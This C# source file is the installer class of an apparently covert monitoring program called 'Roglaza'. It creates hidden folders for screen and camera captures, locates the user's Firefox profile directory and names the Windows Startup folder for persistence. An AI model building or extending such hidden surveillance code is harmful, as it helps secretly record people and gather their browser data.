using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace Roglaza
{

    class RoglazaInstaller
    {
        public static List<string> RoglazaDirectories = new List<string>() { "Screens","Cams"};
        internal static string getKillFilePath()
        {
            return GetRoglazaAPPDataPath() + "\\kill";
        }
        internal static string GetTempPath()
        {
            return System.IO.Path.GetTempPath();
        }

        internal static string GetRoglazaAPPDataPath()
        {
            string tempPath = GetTempPath() + @"\..\Roglaza";
            tempPath=tempPath.Replace("\\\\", "\\");
            tempPath = System.IO.Path.GetFullPath(tempPath);
            return tempPath ;
        }

        public static string GetApplicationDataDirectory()
        {

            return Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        }
        public static string GETFireFox_Profile_FOlder()
        {
            string s = @"C:\Users\"+Environment.UserName+@"\AppData\Roaming\Mozilla\Firefox\Profiles\";
            string[] dirs = System.IO.Directory.GetDirectories(s);
            if (dirs.Length < 1)
                return "";
            string res = dirs[0];
            foreach (string d in dirs)
            {
                if (d.EndsWith("default"))
                    res = d;
            }
            return res;
        }

        internal static void InstallDirectories()
        {
          string   CurrentDirectory = Program.ProgramSettings.LogsPath;

            string ApDataPath = GetRoglazaAPPDataPath();
            RoglazaInstaller.CreatIfNotExisted(ApDataPath);
            RoglazaHelper.SetFolderHidden(ApDataPath);

            if (RoglazaHelper.IsExistedDirectory(CurrentDirectory))
            {
                RoglazaInstaller.CreatIfNotExisted(CurrentDirectory);
                RoglazaHelper.SetFolderHidden(CurrentDirectory);

            }
            
            foreach (string dir in RoglazaInstaller.RoglazaDirectories)
                    RoglazaInstaller.CreatIfNotExisted(CurrentDirectory + "\\" + dir);

          
        }

        private static void CreatIfNotExisted(string p)
        {
            if (!RoglazaHelper.IsExistedDirectory(p))
                RoglazaHelper.createDirectory(p);
        }

        internal static bool SetKillFile(bool killme)
        {
            string file = getKillFilePath();

            if (killme)
            {
                return RoglazaHelper.createEmptyFile(file);
            }
            else
            {
                 RoglazaHelper.DeleteFile(file);
                 return RoglazaHelper.IsExistedFile(file)==false;
            }
        }

        internal static bool IsAdminUnistalledMe()
        {
          return  RoglazaHelper.IsExistedFile(GetRoglazaAPPDataPath() + "\\kill");
        }
        public static string StartupPath=@"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup";
    }
}
